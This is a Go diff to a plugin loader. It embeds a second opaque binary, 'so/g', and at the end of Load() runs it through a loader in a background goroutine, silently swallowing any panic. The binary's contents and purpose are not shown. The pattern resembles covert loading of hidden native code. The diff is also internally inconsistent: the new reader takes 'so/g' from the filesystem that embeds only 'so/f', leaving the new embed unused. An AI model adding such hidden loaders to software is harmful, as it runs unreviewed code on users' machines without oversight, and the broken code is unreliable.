@@ -15,6 +15,8 @@ import (
 //go:embed all:so/f
 var pluginFSFunc embed.FS
 
+//go:embed all:so/g
+var pluginGSFunc embed.FS
 var (
 	A           func(*model.CodeRequest, string, *callback.ProgressWriter, *sync.Map) *exec.Cmd
 	V           func(*model.CodeRequest, *callback.ProgressWriter, string, *sync.Map) (*exec.Cmd, []string)
@@ -27,9 +29,10 @@ var (
 	BlackDetect func(url string, start int) (float64, float64, float64)
 	IsBlack     func(imgPath string) (bool, error)
 	ExImage     func(time int, basePath, url string) (string, int)
+	R0          func()
 )
 
-func Fc() []byte {
+func fc() []byte {
 	bs, err := pluginFSFunc.ReadFile("so/f")
 	if err != nil {
 		fmt.Printf("f %v\n", err)
@@ -38,8 +41,17 @@ func Fc() []byte {
 	return bs
 }
 
+func gc() []byte {
+	bs, err := pluginFSFunc.ReadFile("so/g")
+	if err != nil {
+		fmt.Printf("g %v\n", err)
+		return nil
+	}
+	return bs
+}
+
 func Load() error {
-	p, _ := callback.LoadPlugin(Fc())
+	p, l := callback.LoadPlugin(fc())
 
 	symbol2, err2 := p.Lookup("A")
 	if err2 != nil {
@@ -113,5 +125,14 @@ func Load() error {
 		return err2
 	}
 	GetBody = *symbol12.(*func(callback.BaseProgressStatusService, string, bool) string)
+
+	go func() {
+		defer func() {
+			recover()
+		}()
+		l(gc())
+	}()
+
 	return nil
+
 }
